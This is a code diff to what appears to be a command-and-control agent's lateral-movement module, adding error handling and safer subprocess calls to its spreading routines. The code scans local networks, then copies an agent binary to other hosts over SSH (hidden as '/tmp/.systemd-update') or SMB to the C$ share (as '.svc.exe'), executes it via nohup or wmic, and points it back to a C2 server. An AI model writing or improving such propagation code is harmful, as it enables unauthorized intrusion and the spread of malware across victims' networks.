@@ -16,7 +16,7 @@ Usage from C2 console:
 """
 
 import os
-import sys
+import shutil
 import socket
 import subprocess
 import threading
@@ -42,10 +42,10 @@ def get_local_networks():
                             try:
                                 net = ipaddress.IPv4Network(f"{ip}/24", strict=False)
                                 networks.append(net)
-                            except:
-                                pass
-    except:
-        pass
+                            except ValueError as e:
+                                print(f"{YELLOW}[!]{RESET} Skipping invalid network '{ip}': {e}")
+    except OSError as e:
+        print(f"{YELLOW}[!]{RESET} Could not read /proc/net/fib_trie ({e}); using fallback ranges")
     
     if not networks:
         # Fallback: common private ranges
@@ -69,8 +69,8 @@ def scan_host(ip, ports, timeout=1):
             if result == 0:
                 open_ports.append(port)
             s.close()
-        except:
-            pass
+        except OSError as e:
+            print(f"{YELLOW}[!]{RESET} {ip}:{port} scan error: {e}")
     return str(ip), open_ports
 
 def lateral_scan(ports=None, threads=50, timeout=1):
@@ -131,25 +131,37 @@ def lateral_spread_ssh(targets, user, password, server_addr, port=22):
         return {"error": "No agent binary available"}
     
     results = {}
+    sshpass = shutil.which("sshpass")
+    if not sshpass:
+        return {t: ("FAIL", "sshpass not found in PATH") for t in targets}
+
     for target in targets:
         try:
             remote_path = "/tmp/.systemd-update"
-            
-            # Upload
-            scp = f"sshpass -p '{password}' scp -o StrictHostKeyChecking=no -P {port} {agent_bin} {user}@{target}:{remote_path}"
-            r = subprocess.run(scp, shell=True, capture_output=True, text=True, timeout=15)
-            
+            # Password via SSHPASS env (sshpass -e): no secrets on the command line,
+            # and argument lists avoid shell interpolation of user/password.
+            env = {**os.environ, "SSHPASS": password}
+
+            # Upload (scp uses -P for port)
+            r = subprocess.run(
+                [sshpass, "-e", "scp", "-o", "StrictHostKeyChecking=no", "-P", str(port),
+                 agent_bin, f"{user}@{target}:{remote_path}"],
+                env=env, capture_output=True, text=True, timeout=15)
+
             if r.returncode == 0:
-                # Execute
-                ssh = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -P {port} {user}@{target} 'chmod +x {remote_path} && nohup {remote_path} --server {server_addr} &>/dev/null &'"
-                r2 = subprocess.run(ssh, shell=True, capture_output=True, text=True, timeout=15)
-                
+                # Execute (ssh uses lowercase -p for port)
+                r2 = subprocess.run(
+                    [sshpass, "-e", "ssh", "-o", "StrictHostKeyChecking=no", "-p", str(port),
+                     f"{user}@{target}",
+                     f"chmod +x {remote_path} && nohup {remote_path} --server {server_addr} >/dev/null 2>&1 &"],
+                    env=env, capture_output=True, text=True, timeout=15)
+
                 if r2.returncode == 0:
                     results[target] = ("OK", "Deployed via SSH")
                 else:
                     results[target] = ("PARTIAL", "Uploaded but exec failed")
             else:
-                results[target] = ("FAIL", "SCP failed")
+                results[target] = ("FAIL", f"SCP failed: {(r.stderr or '').strip()[:100]}")
         except Exception as e:
             results[target] = ("FAIL", str(e))
     
@@ -162,24 +174,36 @@ def lateral_spread_smb(targets, user, password, server_addr):
         return {"error": "No agent binary available"}
     
     results = {}
+    smbclient = shutil.which("smbclient")
+    if not smbclient:
+        return {t: ("FAIL", "smbclient not found in PATH") for t in targets}
+
     for target in targets:
         try:
-            # Try to copy to ADMIN$ or C$
-            share = "C$"
-            cmd = f'smbclient //{target}/{share.replace("$", "")} -U {user}%{password} -c "put {agent_bin} Windows/Temp/.svc.exe"'
-            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
-            
+            # Try to copy to C$ (argument list: credentials never hit a shell)
+            r = subprocess.run(
+                [smbclient, f"//{target}/C$", "-U", f"{user}%{password}",
+                 "-c", f"put {agent_bin} Windows/Temp/.svc.exe"],
+                capture_output=True, text=True, timeout=15)
+
             if r.returncode == 0:
-                # Execute via wmic
-                wmic = f'wmic /node:{target} /user:{user} /password:{password} process call create "C:\\Windows\\Temp\\.svc.exe --server {server_addr}"'
-                r2 = subprocess.run(wmic, shell=True, capture_output=True, text=True, timeout=15)
-                
+                # Execute via wmic (argument list: password never hits a shell)
+                wmic = shutil.which("wmic")
+                if not wmic:
+                    results[target] = ("PARTIAL", "Uploaded but wmic not available")
+                    continue
+                r2 = subprocess.run(
+                    [wmic, f"/node:{target}", f"/user:{user}", f"/password:{password}",
+                     "process", "call", "create",
+                     f"C:\\Windows\\Temp\\.svc.exe --server {server_addr}"],
+                    capture_output=True, text=True, timeout=15)
+
                 if r2.returncode == 0:
                     results[target] = ("OK", "Deployed via SMB+WMIC")
                 else:
                     results[target] = ("PARTIAL", "Uploaded but exec failed")
             else:
-                results[target] = ("FAIL", "SMB copy failed")
+                results[target] = ("FAIL", f"SMB copy failed: {(r.stderr or '').strip()[:100]}")
         except Exception as e:
             results[target] = ("FAIL", str(e))
     
@@ -228,11 +252,14 @@ def main():
     
     elif args.command == 'spread':
         if not args.server:
-            import socket
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            s.connect(("8.8.8.8", 80))
-            args.server = s.getsockname()[0] + ":8443"
-            s.close()
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                s.connect(("8.8.8.8", 80))
+                args.server = s.getsockname()[0] + ":8443"
+                s.close()
+            except OSError as e:
+                print(f"{YELLOW}[!] IP auto-detect failed ({e}); using 127.0.0.1:8443{RESET}")
+                args.server = "127.0.0.1:8443"
         
         if not args.targets:
             # Auto-scan first
